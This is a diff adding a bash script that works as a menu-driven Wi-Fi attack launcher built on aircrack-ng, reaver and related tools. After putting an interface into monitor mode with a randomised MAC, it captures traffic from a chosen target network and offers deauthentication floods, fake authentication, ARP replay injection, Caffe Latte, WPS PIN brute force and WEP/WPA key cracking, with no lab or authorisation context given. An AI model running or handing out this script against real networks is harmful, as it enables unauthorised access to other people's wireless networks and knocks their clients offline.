@@ -1,0 +1,185 @@
+#!/bin/bash
+##############################
+#Functions
+##############################
+function FakeAuth()
+{
+
+LEN1=$(echo ${#targetESSID})
+if [ $LEN -lt 2 ]; then
+gnome-terminal -x sh -c 'aireplay-ng -1 0 -a "$targetBSSID" "$interfaceName"; exec bash' 
+else
+gnome-terminal -x sh -c 'aireplay-ng -1 0 -a "$targetBSSID" -e "$targetESSID" "$interfaceName"; exec bash' 
+fi
+}
+function InjectARP()
+{
+gnome-terminal -x sh -c 'aireplay-ng -3 -b "$targetBSSID" "$interfaceName"; exec bash'
+}
+function Airodump()
+{
+    rm airodumpcap*
+    rm airodumpcap*
+    rm airodumpcap*
+    rm airodumpcap*
+    rm airodumpcap*
+	gnome-terminal -x sh -c 'airodump-ng -c "$targetChannel" --bssid "$targetBSSID" -w airodumpcap12 "$interfaceName"; exec bash'
+return
+}
+function Deauth()
+{
+    echo "Enter client MAC (if you have one): "
+    read targetClient
+    LEN=$(echo ${#targetClient})
+    if [ $LEN -lt 17 ]; then
+	gnome-terminal -x sh -c 'aireplay-ng -0 0 -a "$targetBSSID" "$interfaceName"; exec bash'
+	else
+	gnome-terminal -x sh -c 'aireplay-ng -0 0  -a "$targetBSSID" -c "$targetClient" "$interfaceName"; exec bash'
+    fi
+    startAttack
+	}
+function Aircrack()
+{
+gnome-terminal -x sh -c 'aircrack-ng -w airdump --bssid "$targetBSSID" airodumpcap12-01.cap; exec bash'
+}
+function CafeLate()
+{
+gnome-terminal -x sh -c 'aireplay-ng -6 -h "$targetClient" -b "$targetBSSID" -D "$interfaceName"; exec bash'
+}
+function Airdecloak()
+{
+gnome-terminal -x sh -c 'airdecloak-ng -h; exec bash'
+}
+function besside()
+{
+gnome-terminal -x sh -c 'besside-ng -v "$interfaceName"; exec bash'
+}
+function wesside()
+{
+gnome-terminal -x sh -c 'wesside-ng -i "$interfaceName"; exec bash'
+}
+function washStart()
+{
+ gnome-terminal -x sh -c 'wash -i "$interfaceName"; exec bash'
+}
+function Normalize()
+{
+ifconfig "$interfaceName" down
+sleep 2
+macchanger -r "$interfaceName"
+sleep 2
+iwconfig "$interfaceName" mode managed
+sleep 2
+ifconfig "$interfaceName" up
+sleep 2
+service network-manager restart
+}
+function startReaver()
+{
+gnome-terminal -x sh -c 'reaver -i "$interfaceName" -b "$targetBSSID" -c "$targetChannel" -vv -K 1; exec bash'
+}
+##############################
+#Gather input function
+##############################
+function grabInputs()
+{
+airmon-ng
+echo " "
+echo "Enter interface name to set in monitor mode (if its already in monitor mode just enter full interface name like wlan0mon): "
+read interfaceName1
+airmon-ng check kill
+sleep 2
+ifconfig "$interfaceName1" down
+sleep 2
+macchanger -r "$interfaceName1"
+sleep 2
+ifconfig "$interfaceName1" up
+sleep 2
+airmon-ng start "$interfaceName1"
+sleep 2
+echo " "
+echo "Enter new interface name (usually wlan0mon): "
+read interfaceName
+echo "Starting Airodump press ctrl + c when ready"
+sleep 3
+airodump-ng "$interfaceName"
+echo "Enter target BSSID: "
+read targetBSSID
+rm inputs.txt
+
+echo targetBSSID="$targetBSSID" >>inputs.txt
+
+echo "Enter target Channel #: "
+read targetChannel
+echo targetChannel="$targetChannel" >>inputs.txt
+
+echo "Enter ESSID: "
+read targetESSID
+echo targetESSID="$targetESSID" >>inputs.txt
+export targetBSSID
+export interfaceName
+export targetChannel
+export targetClient
+export targetESSID
+startAttack
+}
+##############################
+#Decision case
+##############################
+function startAttack()
+{
+echo "What would you like to do? 1 - Airodump 2 - FakeAuth 3 - InjectARP 4 - Aircrack 5 - Besside 6 - Wesside 7 - Wash 8 - Reaver 9 - CafeLate 10 - Deauth 11 - Normalize and Exit"
+read attackType
+case $attackType in
+    1)
+    Airodump
+    startAttack
+    ;;
+    2)
+    FakeAuth
+    startAttack
+    ;;
+    3)
+    InjectARP
+    startAttack
+    ;;
+    4)
+    Aircrack
+    startAttack
+    ;;
+    5)
+    besside
+    startAttack
+    ;;
+    6)
+    wesside
+    startAttack
+    ;;
+    7)
+    washStart
+    startAttack
+    ;;
+    8)
+    startReaver
+    startAttack
+    ;;
+    9)
+    CafeLate
+    startAttack
+    ;;
+    10)
+    Deauth
+    ;;
+    11)
+    Normalize
+    ;;
+    
+esac
+}
+
+#call to gather inputs
+grabInputs
+
+
+
+
